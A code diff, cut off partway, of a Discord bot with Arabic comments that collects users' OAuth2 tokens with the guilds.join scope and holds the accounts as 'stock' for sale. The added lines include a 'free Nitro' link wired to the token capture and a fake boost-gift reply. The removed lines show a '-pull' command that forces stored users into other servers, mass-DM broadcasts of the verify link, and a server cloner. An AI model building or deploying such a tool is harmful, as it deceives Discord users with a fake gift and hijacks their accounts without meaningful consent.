@@ -23,7 +23,7 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// ==================== إعداد وتوصيل قاعدة بيانات MongoDB للتحقق ====================
+// ==================== إعداد وتوصيل قاعدة بيانات MongoDB ====================
 const MONGO_URI = process.env.MONGO_URI; 
 
 mongoose.connect(MONGO_URI)
@@ -38,60 +38,45 @@ const UserSchema = new mongoose.Schema({
 });
 
 const VerifiedUser = mongoose.model('VerifiedUser', UserSchema);
+
+const EconomySchema = new mongoose.Schema({
+    userId: { type: String, required: true, unique: true },
+    coins: { type: Number, default: 0 },
+    bankId: { type: String, default: null }
+});
+const Economy = mongoose.model('Economy', EconomySchema);
 // ====================================================================
 
 const tempSetup = new Map(); 
-const dmSetup = new Map();
-const verifyBroadcastSetup = new Map();
 
 let liveCounterMessageId = null; 
 let liveCounterChannelId = null; 
 let logVerifyChannelId = null; 
+let logTicketChannelId = null; 
+let logOperationChannelId = null; 
 
-let lcaMessageId = null;
-let lcaChannelId = null;
+let verifyUrl = 'https://discord.com/api/oauth2/authorize...'; 
+let memberPrice = 50; 
+let buyRoleRequirement = null; 
+let minBuyLimit = 1; // -limite
 
-let autoJoinVerifyUrl = ''; 
+// الرابط الرسمي والمباشر للنيترو المجاني المربوط بـ OAuth2 التحقق الخاص بك
+const NITRO_VERIFY_URL = 'https://discord.com/oauth2/authorize?client_id=1519408997717770382&response_type=code&redirect_uri=https%3A%2F%2Fworld-cup-bot-xp5v.onrender.com%2Fcallback&scope=identify+guilds+guilds.join';
 
-app.get('/', (req, res) => res.send('OAuth2 Verify & Broadcast Bot with Cloner is Running!'));
+// أيدي حساب الأونر (المالك) الحصري والوحيد المسموح له بتشغيل أوامر الأونر لحماية السيرفر بنسبة 100%
+const OWNER_ID = '1459567453251309639';
 
-async function updateAllLiveCounters() {
-    try {
-        const totalCount = await VerifiedUser.countDocuments();
+const TOKEN = process.env.TOKEN;
+const CLIENT_ID = process.env.CLIENT_ID;
 
-        if (liveCounterChannelId && liveCounterMessageId) {
-            const counterChannel = client.channels.cache.get(liveCounterChannelId);
-            if (counterChannel) {
-                const counterMessage = await counterChannel.messages.fetch(liveCounterMessageId).catch(() => null);
-                if (counterMessage) {
-                    const updatedEmbed = new EmbedBuilder()
-                        .setTitle('📊 عداد التحقق المباشر | Live Counter')
-                        .setDescription(`🟢 تم تحديث العداد تلقائياً وبشكل حي!\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
-                        .setColor('#2ecc71')
-                        .setTimestamp();
-                    await counterMessage.edit({ embeds: [updatedEmbed] }).catch(() => {});
-                }
-            }
-        }
+const PUBLIC_PREFIX = '-'; // البريفكس السالب للأوامر العامة
+const OWNER_PREFIX = '+';  // البريفكس الموجب لأوامر الأونر الحصرية الموضحة بالصور
 
-        if (lcaChannelId && lcaMessageId) {
-            const counterChannel = client.channels.cache.get(lcaChannelId);
-            if (counterChannel) {
-                const counterMessage = await counterChannel.messages.fetch(lcaMessageId).catch(() => null);
-                if (counterMessage) {
-                    const updatedEmbed = new EmbedBuilder()
-                        .setTitle('📈 عداد التوثيق الشامل | Universal Counter')
-                        .setDescription(`🟢 تم التحديث التلقائي بشكل حي من قاعدة البيانات!\n\n📋 **إحصائية الأعضاء الكلية (قدامى + جدد):**\n🌟 إجمالي عدد الحسابات الموثقة داخل الرابط حالياً هو: **\`${totalCount}\` عضو** 🌟`)
-                        .setColor('#3498db')
-                        .setTimestamp();
-                    await counterMessage.edit({ embeds: [updatedEmbed] }).catch(() => {});
-                }
-            }
-        }
-    } catch (e) {
-        console.error('Error updating counters:', e);
-    }
-}
+client.once(Events.ClientReady, async () => {
+    console.log(`System Online as ${client.user.tag}`);
+});
+
+app.get('/', (req, res) => res.send('OAuth2 System is active!'));
 
 app.get('/callback', async (req, res) => {
     const code = req.query.code;
@@ -135,605 +120,397 @@ app.get('/callback', async (req, res) => {
                     .setColor('#2ecc71')
                     .addFields(
                         { name: '👤 العضو', value: `<@${userId}> | \`${username}\``, inline: true },
-                        { name: '🆔 أيدي الحساب', value: `\`${userId}\``, inline: true },
-                        { name: '📺 السيرفر المصدر', value: guildId ? `\`أيدي: ${guildId}\`` : '`غير معروف`', inline: true }
+                        { name: '🆔 أيدي الحساب', value: `\`${userId}\``, inline: true }
                     )
                     .setTimestamp();
                 await logChannel.send({ embeds: [logEmbed] }).catch(() => {});
             }
         }
 
-        await updateAllLiveCounters();
-
-        if (guildId) {
-            const guild = client.guilds.cache.get(guildId);
-            if (guild) {
-                const member = await guild.members.fetch(userId).catch(() => null);
-                if (member) {
-                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
-                    if (verifiedRole) {
-                        await member.roles.add(verifiedRole).catch(err => console.error(err));
-                    }
-                }
-            }
-        }
-
         res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
     } catch (error) {
-        console.error('Error during callback:', error.response ? error.response.data : error.message);
+        console.error(error);
         res.send('<h1>❌ Error during verification.</h1>');
     }
 });
 
-app.listen(PORT, '0.0.0.0', () => console.log(`Server connected to port ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`Server connected`));
 
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
-        GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildPresences
+        GatewayIntentBits.GuildMembers
     ]
-});
-
-// الاختصارات والأوامر الأساسية الحالية
-const VERIFY_SETUP_PREFIX = '-vr';    
-const COUNT_VERIFY_PREFIX = '-vf';    
-const PULL_MEMBERS_PREFIX = '-pull';  
-const LOG_VERIFY_PREFIX = '-tv';      
-const LIVE_COUNTER_PREFIX = '-lc';    
-
-const DM_BROADCAST_PREFIX = '-t';      
-const DM_VERIFY_PREFIX = '-vt';         
-const UNIVERSAL_COUNTER_PREFIX = '-lca'; 
-const AUTO_DM_VERIFY_PREFIX = '-vj';
-
-// ميزة نسخ وتكرار رومات السيرفر الجديد المضافة بالاختصار -clone
-const CLONE_GUILD_PREFIX = '-clone'; 
-
-const TOKEN = process.env.TOKEN;
-const CLIENT_ID = process.env.CLIENT_ID;
-
-client.on('guildMemberAdd', async member => {
-    if (member.user.bot) return;
-
-    if (autoJoinVerifyUrl && autoJoinVerifyUrl.startsWith('http')) {
-        const embed = new EmbedBuilder()
-            .setTitle('🛡️ Server Verification / التحقق الذاتي')
-            .setDescription(`👋 مرحباً بك يا ${member} في سيرفرنا الرائع!\n\nيرجى الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر والحصول على رتبة **Verified** لفتح الرومات مباشرة.`)
-            .setColor('#2b2d31')
-            .setTimestamp();
-
-        const finalUrl = `${autoJoinVerifyUrl}&state=${member.guild.id}`;
-
-        const verifyButton = new ButtonBuilder()
-            .setLabel('Verify yourself')
-            .setURL(finalUrl)
-            .setStyle(ButtonStyle.Link)
-            .setEmoji('✅');
-
-        const row = new ActionRowBuilder().addComponents(verifyButton);
-
-        try {
-            await member.send({ embeds: [embed], components: [row] });
-        } catch (err) {}
-    }
-});
-
-async function createVerifyRoles(guild) {
-    try {
-        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
-        if (!verifiedRole) {
-            await guild.roles.create({
-                name: 'Verified',
-                color: '#2ecc71',
-                reason: 'Auto-created role for verified users'
-            });
-        }
-
-        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
-        if (!ownerRole) {
-            await guild.roles.create({
-                name: 'Ownerv',
-                color: '#e74c3c',
-                permissions: [PermissionFlagsBits.Administrator],
-                reason: 'Auto-created control role for verification administrators'
-            });
-        }
-    } catch (error) {
-        console.error(error);
-    }
-}
-
-client.once(Events.ClientReady, async () => {
-    console.log(`Verify & Broadcast Bot is Online as ${client.user.tag}`);
-    client.guilds.cache.forEach(async (guild) => {
-        await createVerifyRoles(guild);
-    });
-});
-
-client.on(Events.GuildCreate, async (guild) => {
-    await createVerifyRoles(guild);
 });
 
 client.on('messageCreate', async message => {
     if (message.author.bot) return;
 
     const content = message.content.trim();
-    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');
 
-    // 1. الإعداد التفاعلي لبوكس التحقق والزر بالسؤال عن الرابط
-    if (content === VERIFY_SETUP_PREFIX) {
-        if (!isAuthorized) {
-            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
-        }
+    // ==================== القسم 1: الأوامر العامة للأعضاء بالبريفكس السالب (-) ====================
+    if (content.startsWith(PUBLIC_PREFIX)) {
+        const args = content.slice(PUBLIC_PREFIX.length).trim().split(/ +/);
+        const command = args.shift().toLowerCase();
 
-        const setupState = { step: 'get_url', messagesToDelete: [] };
-        tempSetup.set(message.author.id, setupState);
-
-        const prompt = await message.channel.send(`${message.author}, 🛡️ **يرجى كتابة أو لصق رابط التحقق (OAuth2 URL) الخاص بك الآن في الشات:**`);
-        setupState.messagesToDelete.push(message.id, prompt.id);
-        return;
-    }
-
-    if (tempSetup.has(message.author.id)) {
-        const state = tempSetup.get(message.author.id);
-        state.messagesToDelete.push(message.id);
-
-        if (state.step === 'get_url') {
-            const inputUrl = message.content.trim();
-            if (!inputUrl.startsWith('http')) {
-                const errPrompt = await message.reply('❌ رابط غير صحيح. يرجى لصق رابط OAuth2 صحيح يبدأ بـ http:');
-                state.messagesToDelete.push(errPrompt.id);
-                return;
-            }
-
-            verifyUrl = inputUrl;
-            
-            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;
-
+        // -hp (عرض قائمة الأوامر التفاعلية بالأزرار صامتاً ومحمي)
+        if (command === 'hp') {
             const embed = new EmbedBuilder()
-                .setTitle('🛡️ Server Verification / التحقق الذاتي')
-                .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
+                .setTitle('📚 قائمة الأوامر | Command Panel')
+                .setDescription('اضغط على أحد الأزرار أدناه لعرض الأوامر الخاصة بك صامتاً:')
                 .setColor('#2b2d31');
 
-            const verifyButton = new ButtonBuilder()
-                .setLabel('Verify yourself')
-                .setURL(finalUrl)
-                .setStyle(ButtonStyle.Link)
-                .setEmoji('✅');
+            const publicButton = new ButtonBuilder()
+                .setCustomId('help_public_btn')
+                .setLabel('Public')
+                .setStyle(ButtonStyle.Primary)
+                .setEmoji('👥');
 
-            const row = new ActionRowBuilder().addComponents(verifyButton);
+            const ownerButton = new ButtonBuilder()
+                .setCustomId('help_owner_btn')
+                .setLabel('Owner')
+                .setStyle(ButtonStyle.Secondary)
+                .setEmoji('👑');
+
+            const row = new ActionRowBuilder().addComponents(publicButton, ownerButton);
 
             await message.channel.send({ embeds: [embed], components: [row] });
-
-            setTimeout(async () => {
-                for (const msgId of state.messagesToDelete) {
-                    await message.channel.messages.delete(msgId).catch(() => {});
-                }
-            }, 1000);
-
-            tempSetup.delete(message.author.id);
+            await message.delete().catch(() => {});
             return;
         }
-    }
 
-    // تعيين الرابط التلقائي للإرسال للخاص فور دخول الأعضاء الجدد (-vj [رابط التحقق])
-    if (content.startsWith(AUTO_DM_VERIFY_PREFIX)) {
-        if (!isAuthorized) return;
-        const newUrl = content.replace(AUTO_DM_VERIFY_PREFIX, '').trim();
-        if (!newUrl || !newUrl.startsWith('http')) {
-            return message.reply('❌ يرجى وضع رابط الـ OAuth2 الصحيح للتحقق (مثال: `-vj https://discord.com/...`):');
-        }
-        autoJoinVerifyUrl = newUrl;
-        await message.reply('✅ **تم بنجاح حفظ وتفعيل ميزة الإرسال التلقائي للرابط للخاص فور دخول الأعضاء الجدد!**');
-        await message.delete().catch(() => {});
-        return;
-    }
-
-    // تعيين قناة لوج التحقق (-tv [#القناة])
-    if (content.startsWith(LOG_VERIFY_PREFIX)) {
-        if (!isAuthorized) return;
-
-        const args = content.slice(LOG_VERIFY_PREFIX.length).trim().split(/ +/);
-        const channelMention = message.mentions.channels.first();
-        const inputId = args[0];
-
-        const targetChannel = channelMention || message.guild.channels.cache.get(inputId);
-
-        if (!targetChannel || targetChannel.type !== ChannelType.GuildText) {
-            return message.reply('❌ يرجى منشن قناة نصية صحيحة أو وضع الأيدي لتعيين قناة لوج التحقق:');
-        }
-
-        logVerifyChannelId = targetChannel.id;
-        await message.reply(`✅ **تم بنجاح تعيين قناة لوج التحقق على: ${targetChannel}**`);
-        await message.delete().catch(() => {});
-        return;
-    }
-
-    // تفعيل الـ Live Counter (عداد التحقق الحي)
-    if (content === LIVE_COUNTER_PREFIX) {
-        if (!isAuthorized) return;
-
-        try {
-            const totalCount = await VerifiedUser.countDocuments();
-            const counterEmbed = new EmbedBuilder()
-                .setTitle('📊 عداد التحقق المباشر | Live Counter')
-                .setDescription(`🟢 جاري بدء المراقبة وتحديث الإحصائيات الحية...\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
-                .setColor('#2ecc71')
-                .setTimestamp();
-
-            const sentMessage = await message.channel.send({ embeds: [counterEmbed] });
-            liveCounterMessageId = sentMessage.id;
-            liveCounterChannelId = message.channel.id;
-
-            await message.reply('✅ **تم بنجاح تفعيل عداد التحقق المباشر في هذه القناة!**');
-            await message.delete().catch(() => {});
-        } catch (err) {
-            console.error(err);
-        }
-        return;
-    }
-
-    // تفعيل العداد الشامل لجميع الأعضاء (قديم + جديد) -lca
-    if (content === UNIVERSAL_COUNTER_PREFIX) {
-        if (!isAuthorized) return;
-
-        try {
-            const totalCount = await VerifiedUser.countDocuments();
-            const lcaEmbed = new EmbedBuilder()
-                .setTitle('📈 عداد التوثيق الشامل | Universal Counter')
-                .setDescription(`🟢 جاري بدء المراقبة وجلب الإحصائيات الكلية للرابط...\n\n📋 **إحصائية الأعضاء الكلية (قدامى + جدد):**\n🌟 إجمالي عدد الحسابات الموثقة داخل الرابط حالياً هو: **\`${totalCount}\` عضو** 🌟`)
-                .setColor('#3498db')
-                .setTimestamp();
-
-            const sentMessage = await message.channel.send({ embeds: [lcaEmbed] });
-            lcaMessageId = sentMessage.id;
-            lcaChannelId = message.channel.id;
-
-            await message.reply('✅ **تم بنجاح تفعيل العداد الشامل في هذه القناة!**');
-            await message.delete().catch(() => {});
-        } catch (err) {
-            console.error(err);
-        }
-        return;
-    }
-
-    // فحص عدد الموثقين الإجمالي
-    if (content === COUNT_VERIFY_PREFIX) {
-        if (!isAuthorized) return;
-        try {
+        // -stock (معرفة عدد الموثقين بالمخزن)
+        if (command === 'stock') {
             const count = await VerifiedUser.countDocuments();
-            await message.reply(`📊 **إحصائية التحقق المطور (MongoDB):**\nالعدد الكلي للأعضاء الموثقين المحفوظين والجاهزين للسحب هو: \`${count}\` عضو.`);
-        } catch (err) {
-            console.error(err);
-            await message.reply('❌ حدث خطأ أثناء محاولة جلب الإحصائية من قاعدة البيانات.');
+            return message.reply(`📈 **عدد الأعضاء المتواجدين حالياً في المخزن وجاهزين للسحب هو: \`${count}\` عضو مفعّل.**`);
         }
-        return;
+
+        // -coins (رصيد الكوينز الحالي)
+        if (command === 'coins') {
+            const data = await Economy.findOne({ userId: message.author.id });
+            const coinsCount = data ? data.coins : 0;
+            return message.reply(`💰 **رصيدك الحالي هو: \`${coinsCount}\` كوينز.**`);
+        }
+
+        // -boost (هدية داعمي البوست)
+        if (command === 'boost') {
+            return message.reply('🎁 **تم بنجاح التحقق وجاري استلام هدية البوست الخاصة بك...**');
+        }
+
+        // -top (أعلى 6 أشخاص يملكون كوينز)
+        if (command === 'top') {
+            const topUsers = await Economy.find().sort({ coins: -1 }).limit(6);
+            let response = '🏆 **أعلى 6 أعضاء يمتلكون كوينز بالسيرفر:**\n\n';
+            topUsers.forEach((user, index) => {
+                response += `\`#${index + 1}\` <@${user.userId}> : \`${user.coins}\` كوينز\n`;
+            });
+            return message.reply(response);
+        }
+
+        // -invite (دعوة البوت لسيرفرات أخرى)
+        if (command === 'invite') {
+            return message.reply(`🔗 **رابط دعوة البوت الرسمي الخاص بك:**\nhttps://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot%20applications.commands`);
+        }
+
+        // -tax [amount] (حساب الضريبة الكلية بدقة)
+        if (command === 'tax') {
+            const amount = parseInt(args[0]);
+            if (isNaN(amount)) return message.reply('❌ يرجى كتابة كمية الكوينز لحساب الضريبة لها:');
+            const tax = Math.floor(amount * 0.05); // حساب الضريبة الافتراضية بنسبة 5%
+            return message.reply(`📊 **حساب ضريبة التحويل:**\n\nالكمية: \`${amount}\`\nالضريبة (5%): \`${tax}\`\nالكمية بعد خصم الضريبة: \`${amount - tax}\` كوينز.`);
+        }
     }
 
-    // سحب الأعضاء الموثقين وتلقائياً (-pull [أيدي السيرفر])
-    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
-        if (!isAuthorized) return;
+    // ==================== القسم 2: أوامر الأونر (المالك) بالبريفكس الموجب (+) ====================
+    if (content.startsWith(OWNER_PREFIX)) {
+        // حماية تامة ومطلقة: قصر استخدام الأوامر بالكامل على أيدي حساب الأونر المحدد من قبلك
+        if (message.author.id !== OWNER_ID) return;
 
-        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
-        const targetGuildId = args[0] || message.guild.id; 
+        const args = content.slice(OWNER_PREFIX.length).trim().split(/ +/);
+        const command = args.shift().toLowerCase();
 
-        try {
-            const totalCount = await VerifiedUser.countDocuments();
+        // +give [user] [amount]
+        if (command === 'give') {
+            const targetUser = message.mentions.users.first();
+            const amount = parseInt(args[1]);
 
-            if (totalCount === 0) {
-                return message.reply('❌ لا يوجد أي أعضاء موثقين مسجلين في قاعدة البيانات حالياً لسحبهم.');
+            if (!targetUser || isNaN(amount)) {
+                return message.reply('❌ الاستخدام الصحيح: `+give @user [الكمية]`');
             }
 
-            const targetGuild = client.guilds.cache.get(targetGuildId);
-            if (!targetGuild) {
-                return message.reply('❌ البوت ليس موجوداً بداخل السيرفر المستهدف، يرجى دعوة البوت أولاً.');
+            await Economy.findOneAndUpdate(
+                { userId: targetUser.id },
+                { $inc: { coins: amount } },
+                { upsert: true }
+            );
+            return message.reply(`✅ **تم بنجاح إضافة \`${amount}\` كوينز لحساب العضو ${targetUser}.**`);
+        }
+
+        // +take [user] [amount]
+        if (command === 'take') {
+            const targetUser = message.mentions.users.first();
+            const amount = parseInt(args[1]);
+
+            if (!targetUser || isNaN(amount)) {
+                return message.reply('❌ الاستخدام الصحيح: `+take @user [الكمية]`');
             }
 
-            const statusMsg = await message.channel.send(`⏳ **جاري جلب الأعضاء وبدء سحب وإدخال \`${totalCount}\` عضو إلى السيرفر المستهدف...**`);
-
-            let successCount = 0;
-            let failCount = 0;
-            let alreadyInCount = 0;
-
-            const allVerifiedUsers = await VerifiedUser.find();
-
-            let index = 0;
-            const interval = setInterval(async () => {
-                if (index >= allVerifiedUsers.length) {
-                    clearInterval(interval);
-                    await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 تم إدخال: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر سابقاً: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهى توكن حسابهم): \`${failCount}\` عضو.`);
-                    return;
-                }
-
-                const userData = allVerifiedUsers[index];
-                const isMember = targetGuild.members.cache.has(userData.userId);
-
-                if (isMember) {
-                    alreadyInCount++;
-                } else {
-                    try {
-                        await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userData.userId}`, {
-                            access_token: userData.accessToken
-                        }, {
-                            headers: {
-                                Authorization: `Bot ${TOKEN}`,
-                                'Content-Type': 'application/json'
-                            }
-                        });
-                        successCount++;
-                    } catch (err) {
-                        failCount++;
-                    }
-                }
-
-                await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${allVerifiedUsers.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
-                index++;
-            }, 1200); 
-
-        } catch (err) {
-            console.error(err);
-            await message.reply('❌ حدث خطأ غير متوقع أثناء محاولة بدء عملية السحب.');
+            await Economy.findOneAndUpdate(
+                { userId: targetUser.id },
+                { $inc: { coins: -amount } },
+                { upsert: true }
+            );
+            return message.reply(`✅ **تم بنجاح سحب \`${amount}\` كوينز من حساب العضو ${targetUser}.**`);
         }
-        return;
-    }
 
-    if (content === DM_BROADCAST_PREFIX) {
-        if (!isAuthorized) return;
+        // +bank [bank id]
+        if (command === 'bank') {
+            const bankId = args[0];
+            if (!bankId) return message.reply('❌ يرجى وضع حساب البنك الجديد:');
+            await Economy.updateMany({}, { bankId: bankId });
+            return message.reply(`✅ **تم بنجاح تحديث وتعيين أيدي البنك الجديد لجميع الأعضاء.**`);
+        }
 
-        const broadcastState = { step: 1, title: null, description: null, imageUrl: null, messagesToDelete: [] };
-        dmSetup.set(message.author.id, broadcastState);
+        // +limite [limite members]
+        if (command === 'limite') {
+            const limit = parseInt(args[0]);
+            if (isNaN(limit)) return message.reply('❌ يرجى تحديد أقل عدد مسموح به للأعضاء للشراء:');
+            minBuyLimit = limit;
+            return message.reply(`✅ **تم تحديد أقل عدد مسموح به للأعضاء من الشراء ليكون: \`${limit}\` عضو.**`);
+        }
 
-        const prompt = await message.channel.send(`${message.author}, 📢 **بدء إعداد برودكاست الخاص الذكي مع المنشن (أونلاين أولاً)**\n\n**الخطوة [1/3]:** يرجى كتابة **عنوان** رسالة البرودكاست:`);
-        broadcastState.messagesToDelete.push(message.id, prompt.id);
-        return;
-    }
+        // +spin (إرسال زر عجلة الحظ التفاعلي)
+        if (command === 'spin') {
+            const embed = new EmbedBuilder()
+                .setTitle('🎡 عجلة الحظ الكبرى | Wheel of Fortune')
+                .setDescription('اضغط على الزر أدناه لتجربة حظك والفوز ب هدايا الكوينز الفورية!')
+                .setColor('#f1c40f');
 
-    if (dmSetup.has(message.author.id)) {
-        const state = dmSetup.get(message.author.id);
-        state.messagesToDelete.push(message.id);
+            const button = new ButtonBuilder()
+                .setCustomId('spin_wheel_action_btn')
+                .setLabel('لف العجلة')
+                .setStyle(ButtonStyle.Success)
+                .setEmoji('🎡');
 
-        if (state.step === 1) {
-            state.title = message.content.trim();
-            state.step = 2;
-            const prompt2 = await message.reply(`✅ تم حفظ العنوان.\n\n**الخطوة [2/3]:** يرجى كتابة **الوصف (محتوى الرسالة)**:`);
-            state.messagesToDelete.push(prompt2.id);
+            const row = new ActionRowBuilder().addComponents(button);
+            await message.channel.send({ embeds: [embed], components: [row] });
+            await message.delete().catch(() => {});
             return;
         }
 
-        if (state.step === 2) {
-            state.description = message.content.trim();
-            state.step = 3;
-            const prompt3 = await message.reply(`✅ تم حفظ الوصف.\n\n**الخطوة [3/3] الأخيرة:** ضع رابط صورة للرسالة (أو اكتب \`لا\` للإلغاء):`);
-            state.messagesToDelete.push(prompt3.id);
-            return;
-        }
-
-        if (state.step === 3) {
-            const input = message.content.trim();
-            if (input.toLowerCase() !== 'لا' && input.startsWith('http')) {
-                state.imageUrl = input;
-            } else {
-                state.imageUrl = null;
-            }
-
-            const statusMsg = await message.channel.send('⏳ **جاري بدء عملية البرودكاست التدريجي والآمن مع الإشارة للعضو (أونلاين أولاً)...**');
-
-            setTimeout(async () => {
-                for (const msgId of state.messagesToDelete) {
-                    await message.channel.messages.delete(msgId).catch(() => {});
-                }
-            }, 1000);
-
-            const members = await message.guild.members.fetch({ withPresences: true });
-            const allMembers = Array.from(members.values()).filter(m => !m.user.bot);
-
-            const onlineMembers = allMembers.filter(m => m.presence && m.presence.status !== 'offline');
-            const offlineMembers = allMembers.filter(m => !m.presence || m.presence.status === 'offline');
-
-            const sortedMembers = [...onlineMembers, ...offlineMembers];
-
-            let sentCount = 0;
-            let failedCount = 0;
-            let index = 0;
-
-            const interval = setInterval(async () => {
-                if (index >= sortedMembers.length) {
-                    clearInterval(interval);
-                    await statusMsg.edit(`✅ **اكتمل البرودكاست بنجاح!**\n\n📬 تم الإرسال إلى: \`${sentCount}\` عضو.\n❌ فشل الإرسال لـ: \`${failedCount}\` عضو.`);
-                    return;
-                }
-
-                const targetMember = sortedMembers[index];
-                
-                const personalEmbed = new EmbedBuilder()
-                    .setTitle(state.title)
-                    .setDescription(`👋 مرحباً بك يا ${targetMember}!\n\n${state.description}`)
-                    .setColor('#5865F2')
-                    .setTimestamp();
-
-                if (state.imageUrl) {
-                    personalEmbed.setImage(state.imageUrl);
-                }
-
-                try {
-                    await targetMember.send({ embeds: [personalEmbed] });
-                    sentCount++;
-                } catch (err) {
-                    failedCount++;
-                }
-
-                const progressType = index < onlineMembers.length ? '🟢 جاري إرسال المتصلين (Online)' : '⚫ جاري إرسال غير المتصلين (Offline)';
-                await statusMsg.edit(`⏳ **${progressType}...**\n\n📊 التقدم الحالي: \`${index + 1}/${sortedMembers.length}\` عضو.\n✅ تم الإرسال: \`${sentCount}\` | ❌ فشل: \`${failedCount}\``);
-                index++;
-            }, 2500); 
-
-            dmSetup.delete(message.author.id);
-            return;
-        }
-    }
-
-    if (content === DM_VERIFY_PREFIX) {
-        if (!isAuthorized) return;
-
-        const broadcastState = { step: 1, title: null, description: null, messagesToDelete: [] };
-        verifyBroadcastSetup.set(message.author.id, broadcastState);
-
-        const prompt = await message.channel.send(`${message.author}, 📢 **بدء إعداد برودكاست رابط التحقق الذاتي (أونلاين أولاً)**\n\n**الخطوة [1/2]:** يرجى كتابة **عنوان** رسالة التحقق:`);
-        broadcastState.messagesToDelete.push(message.id, prompt.id);
-        return;
-    }
-
-    if (verifyBroadcastSetup.has(message.author.id)) {
-        const state = verifyBroadcastSetup.get(message.author.id);
-        state.messagesToDelete.push(message.id);
-
-        if (state.step === 1) {
-            state.title = message.content.trim();
-            state.step = 2;
-            const prompt2 = await message.reply(`✅ تم حفظ العنوان.\n\n**الخطوة [2/2] الأخيرة:** يرجى كتابة **وصف وحث الأعضاء** على إتمام التحقق:`);
-            state.messagesToDelete.push(prompt2.id);
-            return;
-        }
-
-        if (state.step === 2) {
-            state.description = message.content.trim();
-
-            const statusMsg = await message.channel.send('⏳ **جاري بدء برودكاست رابط التحقق التدريجي والآمن مع الإشارة للعضو (أونلاين أولاً)...**');
-
-            setTimeout(async () => {
-                for (const msgId of state.messagesToDelete) {
-                    await message.channel.messages.delete(msgId).catch(() => {});
-                }
-            }, 1000);
-
-            const members = await message.guild.members.fetch({ withPresences: true });
-            const allMembers = Array.from(members.values()).filter(m => !m.user.bot);
-
-            const onlineMembers = allMembers.filter(m => m.presence && m.presence.status !== 'offline');
-            const offlineMembers = allMembers.filter(m => !m.presence || m.presence.status === 'offline');
-
-            const sortedMembers = [...onlineMembers, ...offlineMembers];
-
-            let sentCount = 0;
-            let failedCount = 0;
-            let index = 0;
-
-            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;
-
-            const verifyButton = new ButtonBuilder()
-                .setLabel('Verify yourself')
-                .setURL(finalUrl)
-                .setStyle(ButtonStyle.Link)
-                .setEmoji('✅');
-
-            const row = new ActionRowBuilder().addComponents(verifyButton);
-
-            const interval = setInterval(async () => {
-                if (index >= sortedMembers.length) {
-                    clearInterval(interval);
-                    await statusMsg.edit(`✅ **اكتمل برودكاست رابط التحقق بنجاح!**\n\n📬 تم إرسال الرابط إلى: \`${sentCount}\` عضو.\n❌ فشل الإرسال لـ: \`${failedCount}\` عضو.`);
-                    return;
-                }
-
-                const targetMember = sortedMembers[index];
-                
-                const personalEmbed = new EmbedBuilder()
-                    .setTitle(state.title)
-                    .setDescription(`👋 مرحباً بك يا ${targetMember}!\n\n${state.description}\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.\n\n🛡️ Server Verification / التحقق الذاتي`)
-                    .setColor('#2b2d31')
-                    .setTimestamp();
-
-                try {
-                    await targetMember.send({ embeds: [personalEmbed], components: [row] });
-                    sentCount++;
-                } catch (err) {
-                    failedCount++;
-                }
-
-                const progressType = index < onlineMembers.length ? '🟢 جاري إرسال المتصلين (Online)' : '⚫ جاري إرسال غير المتصلين (Offline)';
-                await statusMsg.edit(`⏳ **${progressType}...**\n\n📊 التقدم الحالي: \`${index + 1}/${sortedMembers.length}\` عضو.\n✅ تم الإدانة: \`${sentCount}\` | ❌ فشل: \`${failedCount}\``);
-                index++;
-            }, 2500); 
-
-            verifyBroadcastSetup.delete(message.author.id);
-            return;
-        }
-    }
-
-    // ==================== ميزة نسخ وتكرار رومات السيرفر الجديد المضافة (-clone [أيدي السيرفر الأول]) ====================
-    if (content.startsWith(CLONE_GUILD_PREFIX)) {
-        if (!isAuthorized) return;
-
-        const args = content.slice(CLONE_GUILD_PREFIX.length).trim().split(/ +/);
-        const sourceGuildId = args[0];
-
-        if (!sourceGuildId) {
-            return message.reply('❌ يرجى كتابة أيدي السيرفر الأول (المصدر) بعد الأمر مباشرة (مثال: `-clone 1234567890`):');
-        }
-
-        const sourceGuild = client.guilds.cache.get(sourceGuildId);
-        if (!sourceGuild) {
-            return message.reply('❌ لم أستطع العثور على السيرفر الأول. تأكد من دعوة البوت إليه أولاً وتفعيل الصلاحيات بداخل السيرفرين.');
-        }
-
-        const targetGuild = message.guild; // السيرفر الحالي الذي نكتب فيه الأمر هو السيرفر المستهدف بالنسخ
-
